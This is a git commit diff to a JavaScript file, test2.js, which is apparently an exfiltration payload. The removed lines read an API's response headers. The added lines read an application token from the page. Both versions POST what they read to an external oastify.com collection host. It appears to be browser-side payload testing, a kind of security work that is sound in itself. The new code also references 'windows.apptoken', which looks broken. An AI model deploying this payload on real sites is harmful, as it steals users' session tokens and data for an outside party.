caabfae15370b80ecb9208a728e72deb7659a979
Richard Haaga <richard.haaga@gmail.com>
2023-10-21 11:42:30 +0200

    Update test2.js

--- test2.js
+++ test2.js
@@ -1,12 +1,9 @@
-var req = new XMLHttpRequest();
-req.open('GET', '/api/actions/v1/library/all-actions?lang=sv&question_lang=sv', false);
-req.send(null);
-var l_headers = req.getAllResponseHeaders().toLowerCase();
+var apptoken = windows.apptoken;
 
 const requestOptions = {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ headers: l_headers })
+    body: JSON.stringify({ token: apptoken })
 };
 fetch('https://q3uz5uffubu7mt9ntzz67yeaf1ls9pxe.oastify.com/test2', requestOptions)
     .then(response => response.json())
